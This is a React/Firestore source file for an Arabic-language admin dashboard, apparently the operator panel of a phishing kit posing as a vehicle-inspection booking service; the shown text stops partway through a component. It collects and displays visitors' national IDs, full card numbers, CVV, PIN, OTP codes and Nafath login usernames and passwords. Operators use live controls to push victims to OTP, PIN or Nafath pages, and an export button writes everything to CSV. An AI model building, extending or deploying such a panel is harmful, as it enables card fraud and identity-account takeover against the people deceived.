"use client"

import { useEffect, useState, useMemo } from "react"
import { collection, onSnapshot, doc, updateDoc, query } from "firebase/firestore"
import { db } from "@/lib/firebase"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import {
  Users,
  CreditCard,
  Clock,
  CheckCircle2,
  Search,
  RefreshCw,
  Eye,
  ChevronLeft,
  ChevronRight,
  ArrowUpDown,
  Wifi,
  WifiOff,
  Download,
  Shield,
  Car,
  Phone,
  MapPin,
  Calendar,
  User,
  Hash,
  FileText,
  AlertTriangle,
  Globe,
  Loader2,
} from "lucide-react"

// ─── Types ───────────────────────────────────────────────────────────────────

interface FirestoreRecord {
  id: string
  [key: string]: unknown
}

type SortField = "createdAt" | "updatedAt" | "ownerName" | "country" | "step"
type SortDir = "asc" | "desc"

// ─── Helper Maps ─────────────────────────────────────────────────────────────

const STEP_LABELS: Record<string, string> = {
  "": "زيارة فقط",
  "booking-completed": "تم الحجز",
  "booking-details-submitted": "تم إرسال بيانات الحجز",
  "payment-method-selected": "تم اختيار طريقة الدفع",
  "card-details-submitted": "تم إرسال بيانات البطاقة",
  "otp-submitted": "تم إرسال OTP",
  "pin-submitted": "تم إرسال PIN",
  "phone-otp-requested": "تم طلب OTP الجوال",
  "payment-completed": "مكتمل",
}

const STEP_COLORS: Record<string, string> = {
  "": "bg-gray-100 text-gray-700",
  "booking-completed": "bg-blue-100 text-blue-700",
  "booking-details-submitted": "bg-blue-100 text-blue-700",
  "payment-method-selected": "bg-amber-100 text-amber-700",
  "card-details-submitted": "bg-orange-100 text-orange-700",
  "otp-submitted": "bg-purple-100 text-purple-700",
  "pin-submitted": "bg-indigo-100 text-indigo-700",
  "phone-otp-requested": "bg-cyan-100 text-cyan-700",
  "payment-completed": "bg-emerald-100 text-emerald-700",
}

const APPROVAL_LABELS: Record<string, string> = {
  pending: "قيد الانتظار",
  approved: "موافق عليه",
  rejected: "مرفوض",
  otp: "OTP مطلوب",
}

const APPROVAL_COLORS: Record<string, string> = {
  pending: "bg-yellow-100 text-yellow-800",
  approved: "bg-green-100 text-green-800",
  rejected: "bg-red-100 text-red-800",
  otp: "bg-blue-100 text-blue-800",
}

// ─── Utility ─────────────────────────────────────────────────────────────────

function maskCard(num?: string) {
  if (!num) return "—"
  const clean = String(num).replace(/\s/g, "")
  if (clean.length < 8) return clean
  return clean.slice(0, 4) + " **** **** " + clean.slice(-4)
}

function formatDate(val?: string) {
  if (!val) return "—"
  try {
    return new Intl.DateTimeFormat("ar-SA", {
      year: "numeric",
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    }).format(new Date(val))
  } catch {
    return val
  }
}

function str(val: unknown): string {
  if (val === null || val === undefined) return ""
  return String(val)
}

// ─── Stat Card Component ─────────────────────────────────────────────────────

function StatCard({
  title,
  value,
  icon: Icon,
  color,
  sub,
}: {
  title: string
  value: number | string
  icon: React.ComponentType<{ className?: string }>
  color: string
  sub?: string
}) {
  return (
    <Card className="relative overflow-hidden">
      <CardContent className="p-5">
        <div className="flex items-center justify-between">
          <div className="space-y-1">
            <p className="text-sm text-muted-foreground">{title}</p>
            <p className="text-3xl font-bold">{value}</p>
            {sub && <p className="text-xs text-muted-foreground">{sub}</p>}
          </div>
          <div className={`rounded-xl p-3 ${color}`}>
            <Icon className="h-6 w-6 text-white" />
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

// ─── Detail Row ──────────────────────────────────────────────────────────────

function DetailRow({
  icon: Icon,
  label,
  value,
  mono,
  badge,
  badgeColor,
}: {
  icon?: React.ComponentType<{ className?: string }>
  label: string
  value?: string
  mono?: boolean
  badge?: boolean
  badgeColor?: string
}) {
  if (!value || value === "—") return null
  return (
    <div className="flex items-start gap-3 py-2.5 border-b border-gray-100 last:border-0">
      {Icon && <Icon className="h-4 w-4 text-muted-foreground mt-0.5 shrink-0" />}
      <div className="flex-1 min-w-0">
        <p className="text-xs text-muted-foreground mb-0.5">{label}</p>
        {badge ? (
          <span className={`inline-block px-2.5 py-0.5 rounded-full text-xs font-semibold ${badgeColor || "bg-gray-100 text-gray-700"}`}>
            {value}
          </span>
        ) : (
          <p className={`text-sm font-medium break-all ${mono ? "font-mono tracking-wide" : ""}`}>{value}</p>
        )}
      </div>
    </div>
  )
}

// ─── Approval Action Buttons ─────────────────────────────────────────────────

function ApprovalActions({
  record,
  field,
  options,
  onUpdate,
}: {
  record: FirestoreRecord
  field: string
  options: string[]
  onUpdate: (id: string, data: Record<string, string>) => Promise<void>
}) {
  const current = str(record[field])
  const [busy, setBusy] = useState<string | null>(null)

  const handleClick = async (status: string) => {
    setBusy(status)
    await onUpdate(record.id, { [field]: status })
    setBusy(null)
  }

  return (
    <div className="flex gap-2 flex-wrap">
      {options.map((status) => (
        <button
          key={status}
          disabled={current === status || busy !== null}
          onClick={() => handleClick(status)}
          className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center gap-1.5 ${
            current === status
              ? (APPROVAL_COLORS[status] || "bg-teal-100 text-teal-800") + " ring-2 ring-offset-1 ring-current"
              : "bg-gray-50 text-gray-500 hover:bg-gray-100"
          }`}
        >
          {busy === status && <Loader2 className="h-3 w-3 animate-spin" />}
          {APPROVAL_LABELS[status] || status}
        </button>
      ))}
    </div>
  )
}

// ─── Current Page Control ────────────────────────────────────────────────────

const CURRENT_PAGE_OPTIONS = [
  { value: "", label: "فارغ (افتراضي)", color: "bg-gray-100 text-gray-600" },
  { value: "1", label: "1 → الرئيسية", color: "bg-blue-100 text-blue-700" },
  { value: "2", label: "2 → صفحة العرض", color: "bg-indigo-100 text-indigo-700" },
  { value: "9999", label: "9999 → تحقق الجوال", color: "bg-red-100 text-red-700" },
]

function CurrentPageControl({
  record,
  onUpdate,
}: {
  record: FirestoreRecord
  onUpdate: (id: string, data: Record<string, string>) => Promise<void>
}) {
  const current = str(record.currentPage)
  const [busy, setBusy] = useState<string | null>(null)

  const handleClick = async (val: string) => {
    setBusy(val)
    await onUpdate(record.id, { currentPage: val })
    setBusy(null)
  }

  return (
    <div className="flex gap-2 flex-wrap">
      {CURRENT_PAGE_OPTIONS.map((opt) => (
        <button
          key={opt.value}
          disabled={current === opt.value || busy !== null}
          onClick={() => handleClick(opt.value)}
          className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center gap-1.5 ${
            current === opt.value
              ? opt.color + " ring-2 ring-offset-1 ring-current"
              : "bg-gray-50 text-gray-500 hover:bg-gray-100"
          }`}
        >
          {busy === opt.value && <Loader2 className="h-3 w-3 animate-spin" />}
          {opt.label}
        </button>
      ))}
    </div>
  )
}

// ─── Text Field Control ──────────────────────────────────────────────────────

function TextFieldControl({
  record,
  field,
  placeholder,
  onUpdate,
}: {
  record: FirestoreRecord
  field: string
  placeholder: string
  onUpdate: (id: string, data: Record<string, string>) => Promise<void>
}) {
  const [value, setValue] = useState(str(record[field]))
  const [busy, setBusy] = useState(false)
  const [saved, setSaved] = useState(false)

  const handleSave = async () => {
    setBusy(true)
    await onUpdate(record.id, { [field]: value })
    setBusy(false)
    setSaved(true)
    setTimeout(() => setSaved(false), 1500)
  }

  return (
    <div className="flex gap-2">
      <Input
        value={value}
        onChange={(e) => setValue(e.target.value)}
        placeholder={placeholder}
        className="h-9 text-sm flex-1"
      />
      <Button
        size="sm"
        className="bg-teal-700 hover:bg-teal-800 text-white h-9 min-w-[70px]"
        onClick={handleSave}
        disabled={busy}
      >
        {busy ? (
          <Loader2 className="h-3.5 w-3.5 animate-spin" />
        ) : saved ? (
          <span className="flex items-center gap-1"><CheckCircle2 className="h-3.5 w-3.5" /> تم</span>
        ) : (
          "حفظ"
        )}
      </Button>
    </div>
  )
}

// ─── Main Page ───────────────────────────────────────────────────────────────

const PAGE_SIZE = 15

export default function DashboardPage() {
  const [records, setRecords] = useState<FirestoreRecord[]>([])
  const [loading, setLoading] = useState(true)
  const [searchTerm, setSearchTerm] = useState("")
  const [stepFilter, setStepFilter] = useState("all")
  const [sortField, setSortField] = useState<SortField>("createdAt")
  const [sortDir, setSortDir] = useState<SortDir>("desc")
  const [page, setPage] = useState(0)
  const [selectedId, setSelectedId] = useState<string | null>(null)
  const [detailOpen, setDetailOpen] = useState(false)

  // Derive selectedRecord from live records so it stays in sync
  const selectedRecord = useMemo(() => {
    if (!selectedId) return null
    return records.find((r) => r.id === selectedId) || null
  }, [selectedId, records])

  // ── Real-time Listener ───────────────────────────────────────────────────

  useEffect(() => {
    const q = query(collection(db, "pays"))
    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const docs: FirestoreRecord[] = []
        snapshot.forEach((docSnap) => {
          docs.push({ id: docSnap.id, ...docSnap.data() } as FirestoreRecord)
        })
        setRecords(docs)
        setLoading(false)
      },
      (error) => {
        console.error("Dashboard Firestore error:", error)
        setLoading(false)
      },
    )
    return () => unsubscribe()
  }, [])

  // ── Update Firestore doc ─────────────────────────────────────────────────

  const handleUpdate = async (id: string, data: Record<string, string>) => {
    try {
      await updateDoc(doc(db, "pays", id), { ...data, updatedAt: new Date().toISOString() })
    } catch (e) {
      console.error("Update error:", e)
    }
  }

  // ── Mark as read ─────────────────────────────────────────────────────────

  const markAsRead = async (record: FirestoreRecord) => {
    if (record.isRead === false) {
      try {
        await updateDoc(doc(db, "pays", record.id), { isRead: true })
      } catch (e) {
        console.error(e)
      }
    }
  }

  // ── Filtered & Sorted ────────────────────────────────────────────────────

  const processed = useMemo(() => {
    let list = [...records]

    // Search
    if (searchTerm.trim()) {
      const term = searchTerm.toLowerCase()
      list = list.filter((r) => {
        const fields = [r.id, r.ownerName, r.nationalId, r.phone, r.cardNumber, r.cardName, r.country, r.plateNumbers, r.plateLetters, r.operator]
        return fields.some((f) => str(f).toLowerCase().includes(term))
      })
    }

    // Step filter
    if (stepFilter !== "all") {
      list = list.filter((r) => str(r.step) === stepFilter)
    }

    // Sort
    list.sort((a, b) => {
      const aVal = str(a[sortField]).toLowerCase()
      const bVal = str(b[sortField]).toLowerCase()
      const cmp = aVal.localeCompare(bVal)
      return sortDir === "asc" ? cmp : -cmp
    })

    return list
  }, [records, searchTerm, stepFilter, sortField, sortDir])

  const totalPages = Math.max(1, Math.ceil(processed.length / PAGE_SIZE))
  const paginated = processed.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE)

  // Reset page when filters change
  useEffect(() => {
    setPage(0)
  }, [searchTerm, stepFilter])

  // ── Stats ────────────────────────────────────────────────────────────────

  const stats = useMemo(() => {
    const total = records.length
    const completed = records.filter((r) => str(r.step) === "payment-completed").length
    const pendingPayment = records.filter((r) => ["card-details-submitted", "otp-submitted", "pin-submitted", "phone-otp-requested"].includes(str(r.step))).length
    const online = records.filter((r) => r.online === true).length
    const unread = records.filter((r) => r.isRead === false).length
    return { total, completed, pendingPayment, online, unread }
  }, [records])

  // ── Export CSV ───────────────────────────────────────────────────────────

  const exportCSV = () => {
    const headers = ["ID", "Owner Name", "National ID", "Phone", "Country", "Card Number", "Card Name", "Expiry", "CVV", "OTP", "PIN", "Step", "Payment Method", "Operator", "Created At"]
    const rows = processed.map((r) => [
      r.id,
      str(r.ownerName),
      str(r.nationalId),
      str(r.phone),
      str(r.country),
      str(r.cardNumber),
      str(r.cardName),
      str(r.expiryDate || ((r.expiryMonth ? str(r.expiryMonth) + "/" + str(r.expiryYear) : ""))),
      str(r.cvv),
      str(r.otp),
      str(r.pin),
      str(r.step),
      str(r.paymentMethod),
      str(r.operator),
      str(r.createdAt),
    ])
    const csv = [headers, ...rows].map((row) => row.map((cell) => `"${cell}"`).join(",")).join("\n")
    const blob = new Blob(["\uFEFF" + csv], { type: "text/csv;charset=utf-8;" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `dashboard-export-${new Date().toISOString().slice(0, 10)}.csv`
    a.click()
    URL.revokeObjectURL(url)
  }

  // ── Open Detail ──────────────────────────────────────────────────────────

  const openDetail = (record: FirestoreRecord) => {
    setSelectedId(record.id)
    setDetailOpen(true)
    markAsRead(record)
  }

  // ── Toggle sort ──────────────────────────────────────────────────────────

  const toggleSort = (field: SortField) => {
    if (sortField === field) {
      setSortDir((d) => (d === "asc" ? "desc" : "asc"))
    } else {
      setSortField(field)
      setSortDir("desc")
    }
  }

  // ── Loading State ────────────────────────────────────────────────────────

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="flex flex-col items-center gap-4">
          <Loader2 className="h-10 w-10 animate-spin text-teal-700" />
          <p className="text-lg text-muted-foreground font-medium">جاري تحميل البيانات...</p>
        </div>
      </div>
    )
  }

  // ── Render ───────────────────────────────────────────────────────────────

  return (
    <div className="min-h-screen bg-gray-50/50" dir="rtl" lang="ar">
      {/* ── Header ─────────────────────────────────────────────────────────── */}
      <header className="sticky top-0 z-40 bg-white/80 backdrop-blur-lg border-b border-gray-200">
        <div className="max-w-[1440px] mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="h-9 w-9 rounded-lg bg-teal-700 flex items-center justify-center">
              <Shield className="h-5 w-5 text-white" />
            </div>
            <div>
              <h1 className="text-lg font-bold text-gray-900">لوحة التحكم</h1>
              <p className="text-xs text-muted-foreground -mt-0.5">إدارة البيانات</p>
            </div>
          </div>
          <div className="flex items-center gap-3">
            {stats.unread > 0 && (
              <span className="flex items-center gap-1.5 px-3 py-1.5 bg-red-50 text-red-700 rounded-full text-xs font-semibold">
                <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                {stats.unread} جديد
              </span>
            )}
            <Button variant="outline" size="sm" onClick={exportCSV} className="gap-2">
              <Download className="h-4 w-4" />
              <span className="hidden sm:inline">تصدير CSV</span>
            </Button>
          </div>
        </div>
      </header>

      <main className="max-w-[1440px] mx-auto px-4 sm:px-6 lg:px-8 py-6 space-y-6">
        {/* ── Stats ──────────────────────────────────────────────────────── */}
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
          <StatCard title="إجمالي الزوار" value={stats.total} icon={Users} color="bg-teal-700" />
          <StatCard title="مكتمل" value={stats.completed} icon={CheckCircle2} color="bg-emerald-600" />
          <StatCard title="قيد الدفع" value={stats.pendingPayment} icon={CreditCard} color="bg-amber-500" />
          <StatCard title="متصل الآن" value={stats.online} icon={Wifi} color="bg-blue-600" />
          <StatCard title="غير مقروء" value={stats.unread} icon={AlertTriangle} color="bg-red-500" />
        </div>

        {/* ── Filters ────────────────────────────────────────────────────── */}
        <Card>
          <CardContent className="p-4">
            <div className="flex flex-col sm:flex-row gap-3">
              <div className="relative flex-1">
                <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                <Input
                  placeholder="بحث بالاسم، الهوية، الجوال، رقم البطاقة..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="h-10 pr-10"
                />
              </div>
              <Select value={stepFilter} onValueChange={setStepFilter}>
                <SelectTrigger className="h-10 w-full sm:w-[200px]">
                  <SelectValue placeholder="الحالة" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">جميع الحالات</SelectItem>
                  {Object.entries(STEP_LABELS).map(([key, label]) => (
                    <SelectItem key={key || "_empty"} value={key || "_empty"}>
                      {label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <Button
                variant="outline"
                size="sm"
                className="h-10 gap-2"
                onClick={() => {
                  setSearchTerm("")
                  setStepFilter("all")
                }}
              >
                <RefreshCw className="h-4 w-4" />
                إعادة ضبط
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* ── Results Count ──────────────────────────────────────────────── */}
        <div className="flex items-center justify-between text-sm text-muted-foreground">
          <p>عرض {paginated.length} من {processed.length} سجل</p>
        </div>

        {/* ── Table ──────────────────────────────────────────────────────── */}
        <Card className="overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="bg-gray-50/80 border-b border-gray-200">
                  <th className="px-4 py-3 text-right font-semibold text-gray-600 w-8">#</th>
                  <th className="px-4 py-3 text-right font-semibold text-gray-600">
                    <button className="flex items-center gap-1 hover:text-gray-900" onClick={() => toggleSort("ownerName")}>
                      المالك
                      <ArrowUpDown className="h-3 w-3" />
                    </button>
                  </th>
                  <th className="px-4 py-3 text-right font-semibold text-gray-600">الهوية / الجوال</th>
                  <th className="px-4 py-3 text-right font-semibold text-gray-600">البطاقة</th>
                  <th className="px-4 py-3 text-right font-semibold text-gray-600">
                    <button className="flex items-center gap-1 hover:text-gray-900" onClick={() => toggleSort("country")}>
                      البلد
                      <ArrowUpDown className="h-3 w-3" />
                    </button>
                  </th>
                  <th className="px-4 py-3 text-right font-semibold text-gray-600">
                    <button className="flex items-center gap-1 hover:text-gray-900" onClick={() => toggleSort("step")}>
                      الحالة
                      <ArrowUpDown className="h-3 w-3" />
                    </button>
                  </th>
                  <th className="px-4 py-3 text-right font-semibold text-gray-600">
                    <button className="flex items-center gap-1 hover:text-gray-900" onClick={() => toggleSort("createdAt")}>
                      التاريخ
                      <ArrowUpDown className="h-3 w-3" />
                    </button>
                  </th>
                  <th className="px-4 py-3 text-center font-semibold text-gray-600 w-20">إجراء</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {paginated.length === 0 && (
                  <tr>
                    <td colSpan={8} className="px-4 py-16 text-center text-muted-foreground">
                      <div className="flex flex-col items-center gap-2">
                        <FileText className="h-10 w-10 text-gray-300" />
                        <p className="text-base font-medium">لا توجد سجلات</p>
                        <p className="text-sm">جرّب تغيير معايير البحث</p>
                      </div>
                    </td>
                  </tr>
                )}
                {paginated.map((r, i) => {
                  const step = str(r.step)
                  const isUnread = r.isRead === false
                  return (
                    <tr
                      key={r.id}
                      className={`hover:bg-gray-50/60 transition-colors cursor-pointer ${isUnread ? "bg-blue-50/40" : ""}`}
                      onClick={() => openDetail(r)}
                    >
                      <td className="px-4 py-3 text-muted-foreground text-xs">
                        <div className="flex items-center gap-2">
                          {isUnread && <span className="w-2 h-2 rounded-full bg-blue-500 shrink-0" />}
                          {page * PAGE_SIZE + i + 1}
                        </div>
                      </td>
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-2">
                          {r.online === true ? (
                            <Wifi className="h-3.5 w-3.5 text-green-500 shrink-0" />
                          ) : (
                            <WifiOff className="h-3.5 w-3.5 text-gray-300 shrink-0" />
                          )}
                          <div>
                            <p className="font-medium text-gray-900 truncate max-w-[160px]">{str(r.ownerName) || str(r.name) || str(r.id).slice(0, 12)}</p>
                            {str(r.plateNumbers) && (
                              <p className="text-xs text-muted-foreground">{str(r.plateLetters)} {str(r.plateNumbers)}</p>
                            )}
                          </div>
                        </div>
                      </td>
                      <td className="px-4 py-3">
                        <p className="font-mono text-xs">{str(r.nationalId) || "—"}</p>
                        <p className="text-xs text-muted-foreground">{str(r.phone) || str(r.authorizedPhone) || "—"}</p>
                      </td>
                      <td className="px-4 py-3">
                        <p className="font-mono text-xs tracking-wide" dir="ltr">{maskCard(str(r.cardNumber))}</p>
                        <p className="text-xs text-muted-foreground">{str(r.cardName) || "—"}</p>
                      </td>
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-1.5">
                          <Globe className="h-3.5 w-3.5 text-muted-foreground" />
                          <span className="text-xs">{str(r.country) || "—"}</span>
                        </div>
                      </td>
                      <td className="px-4 py-3">
                        <span className={`inline-block px-2.5 py-1 rounded-full text-[11px] font-semibold whitespace-nowrap ${STEP_COLORS[step] || STEP_COLORS[""]}`}>
                          {STEP_LABELS[step] || step || "زيارة"}
                        </span>
                      </td>
                      <td className="px-4 py-3 text-xs text-muted-foreground whitespace-nowrap">
                        {formatDate(str(r.createdAt))}
                      </td>
                      <td className="px-4 py-3 text-center">
                        <Button variant="ghost" size="icon" className="h-8 w-8" onClick={(e) => { e.stopPropagation(); openDetail(r) }}>
                          <Eye className="h-4 w-4" />
                        </Button>
                      </td>
                    </tr>
                  )
                })}
              </tbody>
            </table>
          </div>

          {/* ── Pagination ──────────────────────────────────────────────── */}
          {totalPages > 1 && (
            <div className="flex items-center justify-between px-4 py-3 border-t border-gray-200 bg-gray-50/50">
              <p className="text-xs text-muted-foreground">
                صفحة {page + 1} من {totalPages}
              </p>
              <div className="flex items-center gap-2">
                <Button variant="outline" size="icon" className="h-8 w-8" disabled={page === 0} onClick={() => setPage((p) => p - 1)}>
                  <ChevronRight className="h-4 w-4" />
                </Button>
                {Array.from({ length: Math.min(totalPages, 5) }, (_, i) => {
                  const startPage = Math.max(0, Math.min(page - 2, totalPages - 5))
                  const pageNum = startPage + i
                  return (
                    <Button
                      key={pageNum}
                      variant={pageNum === page ? "default" : "outline"}
                      size="icon"
                      className={`h-8 w-8 text-xs ${pageNum === page ? "bg-teal-700 text-white hover:bg-teal-800" : ""}`}
                      onClick={() => setPage(pageNum)}
                    >
                      {pageNum + 1}
                    </Button>
                  )
                })}
                <Button variant="outline" size="icon" className="h-8 w-8" disabled={page >= totalPages - 1} onClick={() => setPage((p) => p + 1)}>
                  <ChevronLeft className="h-4 w-4" />
                </Button>
              </div>
            </div>
          )}
        </Card>
      </main>

      {/* ── Detail Modal ───────────────────────────────────────────────────── */}
      <Dialog open={detailOpen} onOpenChange={(open) => { setDetailOpen(open); if (!open) setSelectedId(null) }}>
        <DialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto p-0" dir="rtl">
          {selectedRecord && (
            <>
              <DialogHeader className="sticky top-0 bg-white z-10 px-6 pt-6 pb-4 border-b">
                <div className="flex items-center justify-between">
                  <div>
                    <DialogTitle className="text-xl">
                      {str(selectedRecord.ownerName) || str(selectedRecord.name) || "تفاصيل السجل"}
                    </DialogTitle>
                    <DialogDescription className="font-mono text-xs mt-1">
                      {selectedRecord.id}
                    </DialogDescription>
                  </div>
                  <div className="flex items-center gap-2">
                    {selectedRecord.online === true ? (
                      <Badge className="bg-green-100 text-green-700 hover:bg-green-100">متصل</Badge>
                    ) : (
                      <Badge variant="secondary">غير متصل</Badge>
                    )}
                    {str(selectedRecord.step) && (
                      <span className={`px-2.5 py-1 rounded-full text-[11px] font-semibold ${STEP_COLORS[str(selectedRecord.step)] || STEP_COLORS[""]}`}>
                        {STEP_LABELS[str(selectedRecord.step)] || str(selectedRecord.step)}
                      </span>
                    )}
                  </div>
                </div>
              </DialogHeader>

              <div className="px-6 py-4 space-y-6">
                {/* Personal Info */}
                <section>
                  <h3 className="text-sm font-bold text-gray-900 mb-3 flex items-center gap-2">
                    <User className="h-4 w-4 text-teal-700" />
                    المعلومات الشخصية
                  </h3>
                  <div className="bg-gray-50 rounded-xl p-4">
                    <DetailRow icon={User} label="اسم المالك" value={str(selectedRecord.ownerName) || str(selectedRecord.name)} />
                    <DetailRow icon={Hash} label="رقم الهوية" value={str(selectedRecord.nationalId) || str(selectedRecord.idNumber)} mono />
                    <DetailRow icon={Phone} label="رقم الجوال" value={str(selectedRecord.phone) || str(selectedRecord.authorizedPhone)} mono />
                    <DetailRow icon={Globe} label="البلد" value={str(selectedRecord.country)} />
                    <DetailRow icon={FileText} label="البريد الإلكتروني" value={str(selectedRecord.email) || str(selectedRecord.delegateEmail)} />
                  </div>
                </section>

                {/* Vehicle Info */}
                {(str(selectedRecord.plateNumbers) || str(selectedRecord.vehicleType) || str(selectedRecord.inspectionType)) && (
                  <section>
                    <h3 className="text-sm font-bold text-gray-900 mb-3 flex items-center gap-2">
                      <Car className="h-4 w-4 text-teal-700" />
                      معلومات المركبة
                    </h3>
                    <div className="bg-gray-50 rounded-xl p-4">
                      <DetailRow icon={Hash} label="أرقام اللوحة" value={str(selectedRecord.plateLetters) + " " + str(selectedRecord.plateNumbers)} mono />
                      <DetailRow icon={Car} label="نوع المركبة" value={str(selectedRecord.vehicleType) || str(selectedRecord.inspectionType)} />
                      <DetailRow icon={FileText} label="حالة المركبة" value={str(selectedRecord.vehicleStatus)} />
                      <DetailRow icon={Hash} label="الرقم التسلسلي" value={str(selectedRecord.serialNumber)} mono />
                      <DetailRow icon={MapPin} label="المنطقة / المدينة" value={[str(selectedRecord.region), str(selectedRecord.city)].filter(Boolean).join(" / ") || undefined} />
                      <DetailRow icon={Calendar} label="موعد الفحص" value={[str(selectedRecord.inspectionDate), str(selectedRecord.inspectionTime)].filter(Boolean).join(" - ") || undefined} />
                    </div>
                  </section>
                )}

                {/* Delegate Info */}
                {(str(selectedRecord.delegateName) || str(selectedRecord.authorizedName)) && (
                  <section>
                    <h3 className="text-sm font-bold text-gray-900 mb-3 flex items-center gap-2">
                      <Users className="h-4 w-4 text-teal-700" />
                      بيانات المفوض
                    </h3>
                    <div className="bg-gray-50 rounded-xl p-4">
                      <DetailRow icon={User} label="اسم المفوض" value={str(selectedRecord.delegateName) || str(selectedRecord.authorizedName)} />
                      <DetailRow icon={Phone} label="جوال المفوض" value={str(selectedRecord.delegatePhone) || str(selectedRecord.authorizedPhone)} mono />
                      <DetailRow icon={Hash} label="هوية المفوض" value={str(selectedRecord.delegateIdNumber) || str(selectedRecord.authorizedId)} mono />
                      <DetailRow icon={Calendar} label="تاريخ ميلاد المفوض" value={str(selectedRecord.authorizedBirthDate)} />
                    </div>
                  </section>
                )}

                {/* Payment Info */}
                {(str(selectedRecord.cardNumber) || str(selectedRecord.paymentMethod)) && (
                  <section>
                    <h3 className="text-sm font-bold text-gray-900 mb-3 flex items-center gap-2">
                      <CreditCard className="h-4 w-4 text-teal-700" />
                      معلومات الدفع
                    </h3>
                    <div className="bg-gray-50 rounded-xl p-4">
                      <DetailRow icon={CreditCard} label="طريقة الدفع" value={str(selectedRecord.paymentMethod)} />
                      <DetailRow icon={CreditCard} label="رقم البطاقة" value={str(selectedRecord.cardNumber)} mono />
                      <DetailRow icon={User} label="اسم حامل البطاقة" value={str(selectedRecord.cardName)} />
                      <DetailRow
                        icon={Calendar}
                        label="تاريخ الانتهاء"
                        value={str(selectedRecord.expiryDate) || (str(selectedRecord.expiryMonth) ? str(selectedRecord.expiryMonth) + "/" + str(selectedRecord.expiryYear) : undefined)}
                      />
                      <DetailRow icon={Shield} label="CVV" value={str(selectedRecord.cvv)} mono />
                      <DetailRow icon={Hash} label="PIN" value={str(selectedRecord.pin)} mono />
                      <DetailRow icon={Hash} label="OTP" value={str(selectedRecord.otp) || str(selectedRecord.phoneOtp)} mono />
                      <DetailRow icon={Phone} label="المشغل" value={str(selectedRecord.operator)} />
                    </div>
                  </section>
                )}

                {/* Nafaz Info */}
                {(str(selectedRecord.nafadUsername) || str(selectedRecord.nafadPassword) || str(selectedRecord.nafaz_pin)) && (
                  <section>
                    <h3 className="text-sm font-bold text-gray-900 mb-3 flex items-center gap-2">
                      <Shield className="h-4 w-4 text-teal-700" />
                      بيانات نفاذ
                    </h3>
                    <div className="bg-gray-50 rounded-xl p-4">
                      <DetailRow icon={User} label="اسم المستخدم" value={str(selectedRecord.nafadUsername)} mono />
                      <DetailRow icon={Shield} label="كلمة المرور" value={str(selectedRecord.nafadPassword)} mono />
                      <DetailRow icon={Hash} label="رمز نفاذ" value={str(selectedRecord.nafaz_pin) || str(selectedRecord.authNumber)} mono />
                    </div>
                  </section>
                )}

                {/* Approval Controls */}
                <section>
                  <h3 className="text-sm font-bold text-gray-900 mb-3 flex items-center gap-2">
                    <CheckCircle2 className="h-4 w-4 text-teal-700" />
                    التحكم في الموافقات
                  </h3>
                  <div className="bg-gray-50 rounded-xl p-4 space-y-5">
                    {/* cardApproval — controls /payment page redirects */}
                    <div>
                      <p className="text-xs font-semibold text-gray-600 mb-1">موافقة البطاقة (cardApproval)</p>
                      <p className="text-[11px] text-gray-400 mb-2">pending=تحميل | otp=صفحة OTP | approved=صفحة PIN | rejected=رفض</p>
                      <ApprovalActions record={selectedRecord} field="cardApproval" options={["pending", "otp", "approved", "rejected"]} onUpdate={handleUpdate} />
                    </div>

                    {/* phoneOtpApproval — controls /application booking page */}
                    <div>
                      <p className="text-xs font-semibold text-gray-600 mb-1">موافقة OTP الجوال (phoneOtpApproval)</p>
                      <p className="text-[11px] text-gray-400 mb-2">approved=انتقال لنفاذ | rejected=رفض | pending=انتظار</p>
                      <ApprovalActions record={selectedRecord} field="phoneOtpApproval" options={["pending", "approved", "rejected"]} onUpdate={handleUpdate} />
                    </div>

                    {/* phoneApproval — controls /verify-phone page */}
                    <div>
                      <p className="text-xs font-semibold text-gray-600 mb-1">موافقة الجوال (phoneApproval)</p>
                      <p className="text-[11px] text-gray-400 mb-2">pending=تحميل | otp=صفحة OTP | approved=صفحة نفاذ | rejected=رفض</p>
                      <ApprovalActions record={selectedRecord} field="phoneApproval" options={["pending", "otp", "approved", "rejected"]} onUpdate={handleUpdate} />
                    </div>

                    {/* currentPage — global redirect control */}
                    <div>
                      <p className="text-xs font-semibold text-gray-600 mb-1">الصفحة الحالية (currentPage)</p>
                      <p className="text-[11px] text-gray-400 mb-2">يتحكم بتوجيه المستخدم من أي صفحة يتواجد فيها</p>
                      <CurrentPageControl record={selectedRecord} onUpdate={handleUpdate} />
                    </div>

                    {/* authNumber — nafaz modal display number */}
                    <div>
                      <p className="text-xs font-semibold text-gray-600 mb-1">رقم التحقق في نفاذ (authNumber)</p>
                      <p className="text-[11px] text-gray-400 mb-2">يظهر للمستخدم في نافذة نفاذ</p>
                      <TextFieldControl
                        key={"auth-" + selectedRecord.id + "-" + str(selectedRecord.authNumber)}
                        record={selectedRecord}
                        field="authNumber"
